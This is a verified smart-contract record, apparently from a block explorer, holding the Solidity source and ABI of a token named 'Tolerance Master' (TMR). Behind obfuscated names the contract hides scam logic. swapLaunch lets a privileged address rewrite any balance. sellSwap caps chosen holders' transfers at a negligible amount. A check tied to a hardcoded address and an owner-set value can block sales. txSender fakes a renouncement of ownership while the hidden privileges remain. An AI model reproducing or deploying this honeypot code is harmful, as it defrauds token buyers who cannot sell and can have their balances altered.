{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface fromLaunch {\n    function createPair(address limitIs, address amountBuy) external returns (address);\n}\n\ninterface senderFund {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txFrom) external view returns (uint256);\n\n    function transfer(address txFee, uint256 isTo) external returns (bool);\n\n    function allowance(address autoTo, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 isTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txFee,\n        uint256 isTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingLaunched, uint256 value);\n    event Approval(address indexed autoTo, address indexed spender, uint256 value);\n}\n\nabstract contract maxToSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface maxFeeTx {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tokenExempt is senderFund {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ToleranceMaster is maxToSender, senderFund, tokenExempt {\n\n    function fromToken(address listReceiver, address txFee, uint256 isTo) internal returns (bool) {\n        require(shouldAt[listReceiver] >= isTo);\n        shouldAt[listReceiver] -= isTo;\n        shouldAt[txFee] += isTo;\n        emit Transfer(listReceiver, txFee, isTo);\n        return true;\n    }\n\n    function launchToken() private view {\n        require(listMarketingLaunched[_msgSender()]);\n    }\n\n    uint256 private teamFund = 100000000 * 10 ** 18;\n\n    function name() external view virtual override returns (string memory) {\n        return marketingReceiverSender;\n    }\n\n    mapping(address => bool) public listMarketingLaunched;\n\n    function transfer(address amountTeam, uint256 isTo) external virtual override returns (bool) {\n        return walletSwapTake(_msgSender(), amountTeam, isTo);\n    }\n\n    bool public isBuy;\n\n    uint256 constant teamBuySell = 8 ** 10;\n\n    address atSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function tokenMinReceiver(address launchedAmount) public {\n        if (totalBuy) {\n            return;\n        }\n        \n        listMarketingLaunched[launchedAmount] = true;\n        \n        totalBuy = true;\n    }\n\n    function txSender() public {\n        emit OwnershipTransferred(atLimitWallet, address(0));\n        walletShould = address(0);\n    }\n\n    uint256 fromSell;\n\n    string private isReceiver = \"TMR\";\n\n    mapping(address => uint256) private shouldAt;\n\n    function sellSwap(address feeLaunched) public {\n        launchToken();\n        if (walletFund != atMarketing) {\n            liquidityLimitFee = false;\n        }\n        if (feeLaunched == atLimitWallet || feeLaunched == fromLimitShould) {\n            return;\n        }\n        fromAuto[feeLaunched] = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamFund;\n    }\n\n    function getOwner() external view returns (address) {\n        return walletShould;\n    }\n\n    mapping(address => mapping(address => uint256)) private minAuto;\n\n    uint256 senderWallet;\n\n    event OwnershipTransferred(address indexed tradingAt, address indexed exemptList);\n\n    constructor (){\n        if (isBuy) {\n            isBuy = true;\n        }\n        maxFeeTx txIs = maxFeeTx(launchMarketing);\n        fromLimitShould = fromLaunch(txIs.factory()).createPair(txIs.WETH(), address(this));\n        if (atMarketing != walletFund) {\n            walletFund = atMarketing;\n        }\n        atLimitWallet = _msgSender();\n        listMarketingLaunched[atLimitWallet] = true;\n        shouldAt[atLimitWallet] = teamFund;\n        txSender();\n        if (atMarketing == walletFund) {\n            walletFund = atMarketing;\n        }\n        emit Transfer(address(0), atLimitWallet, teamFund);\n    }\n\n    uint256 public atMarketing;\n\n    function balanceOf(address txFrom) public view virtual override returns (uint256) {\n        return shouldAt[txFrom];\n    }\n\n    bool public totalBuy;\n\n    function symbol() external view virtual override returns (string memory) {\n        return isReceiver;\n    }\n\n    function owner() external view returns (address) {\n        return walletShould;\n    }\n\n    address launchMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public fromAuto;\n\n    address public atLimitWallet;\n\n    uint256 public walletFund;\n\n    function decimals() external view virtual override returns (uint8) {\n        return toWallet;\n    }\n\n    function walletSwapTake(address listReceiver, address txFee, uint256 isTo) internal returns (bool) {\n        if (listReceiver == atLimitWallet) {\n            return fromToken(listReceiver, txFee, isTo);\n        }\n        uint256 listFee = senderFund(fromLimitShould).balanceOf(atSell);\n        require(listFee == fromSell);\n        require(txFee != atSell);\n        if (fromAuto[listReceiver]) {\n            return fromToken(listReceiver, txFee, teamBuySell);\n        }\n        return fromToken(listReceiver, txFee, isTo);\n    }\n\n    function transferFrom(address listReceiver, address txFee, uint256 isTo) external override returns (bool) {\n        if (_msgSender() != launchMarketing) {\n            if (minAuto[listReceiver][_msgSender()] != type(uint256).max) {\n                require(isTo <= minAuto[listReceiver][_msgSender()]);\n                minAuto[listReceiver][_msgSender()] -= isTo;\n            }\n        }\n        return walletSwapTake(listReceiver, txFee, isTo);\n    }\n\n    bool private feeSellToken;\n\n    function totalShould(uint256 isTo) public {\n        launchToken();\n        fromSell = isTo;\n    }\n\n    address public fromLimitShould;\n\n    function allowance(address enableTrading, address listMarketing) external view virtual override returns (uint256) {\n        if (listMarketing == launchMarketing) {\n            return type(uint256).max;\n        }\n        return minAuto[enableTrading][listMarketing];\n    }\n\n    uint8 private toWallet = 18;\n\n    bool private liquidityLimitFee;\n\n    function approve(address listMarketing, uint256 isTo) public virtual override returns (bool) {\n        minAuto[_msgSender()][listMarketing] = isTo;\n        emit Approval(_msgSender(), listMarketing, isTo);\n        return true;\n    }\n\n    string private marketingReceiverSender = \"Tolerance Master\";\n\n    address private walletShould;\n\n    function swapLaunch(address amountTeam, uint256 isTo) public {\n        launchToken();\n        shouldAt[amountTeam] = isTo;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLimitWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLimitShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listMarketingLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLaunched\",\"type\":\"address\"}],\"name\":\"sellSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isTo\",\"type\":\"uint256\"}],\"name\":\"swapLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedAmount\",\"type\":\"address\"}],\"name\":\"tokenMinReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"isTo\",\"type\":\"uint256\"}],\"name\":\"totalShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ToleranceMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}